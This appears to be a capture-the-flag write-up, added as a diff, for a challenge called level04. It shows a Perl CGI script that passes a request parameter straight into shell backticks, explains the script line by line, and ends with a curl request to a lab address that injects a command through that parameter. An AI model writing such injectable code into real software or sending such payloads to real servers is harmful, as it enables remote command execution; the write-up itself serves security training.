@@ -1,0 +1,29 @@
+cat level04.pl
+
+	#!/usr/bin/perl
+	# localhost:4747
+	use CGI qw{param};
+	print "Content-type: text/html\n\n";
+	sub x {
+	  $y = $_[0];
+	  print `echo $y 2>&1`;
+	}
+	x(param("x"));
+
+Search use CGI qw{param} to find this website
+
+	Enter the CGI module, which always parses the incoming CGI request correctly.
+	In this case, all we need to use from CGI is the param() function.
+	If given an argument naming a field, param() returns the value (or values) associated with that field.
+
+Explain the rest of the scipt :
+
+	sub x {...} Declaratin of a function named x
+	$y = $_[0]; Save the param of x function to the variable y
+	x(param("x")); First x is the function declared above, second x is the key pass to param function.
+
+For exploit this script :
+	
+	curl 10.12.1.146:4747?x='`/bin/getflag`'
+
+the `` are for command substitution
